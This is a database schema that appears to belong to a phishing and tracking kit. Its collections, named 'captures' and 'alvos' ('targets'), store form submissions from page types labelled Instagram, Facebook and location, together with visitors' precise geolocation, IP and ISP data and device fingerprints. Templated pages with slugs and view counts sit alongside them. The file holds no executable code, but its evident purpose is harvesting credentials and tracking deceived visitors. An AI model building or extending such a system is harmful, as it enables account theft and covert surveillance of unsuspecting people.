-- Updated schema to include user_id for data isolation
-- This ensures each user only sees their own data

-- Updated captures structure with user_id
captures/
  {userId}/
    {captureId}/
      id: string
      pageName: string
      pageType: string (instagram, facebook, location)
      timestamp: number
      formData: object (optional - form submission data)
      geolocation: object (optional)
        latitude: number
        longitude: number
        accuracy: number
        timestamp: number
        city: string
        country: string
        countryCode: string
        region: string
        timezone: string
      ipData: object (optional)
        ip: string
        city: string
        region: string
        country: string
        countryCode: string
        timezone: string
        isp: string
        org: string
        as: string
      deviceInfo: object
        userAgent: string
        platform: string
        language: string
        screenResolution: string
        timezone: string
        cookiesEnabled: boolean

-- Updated alvos structure with user_id
alvos/
  {userId}/
    {alvoId}/
      pageType: string
      pageName: string
      data: object
      timestamp: string
      ipAddress: string
      userAgent: string
      geolocation: object (optional)
      ipData: object (optional)
      deviceInfo: object (optional)

-- Updated pages structure with user_id
pages/
  {userId}/
    {pageId}/
      id: string
      name: string
      slug: string
      template: string
      content: object
      views: number
      createdAt: number
      updatedAt: number

-- System configuration (shared, not per-user)
system/
  configured: boolean
  admin: object
    email: string
    uid: string
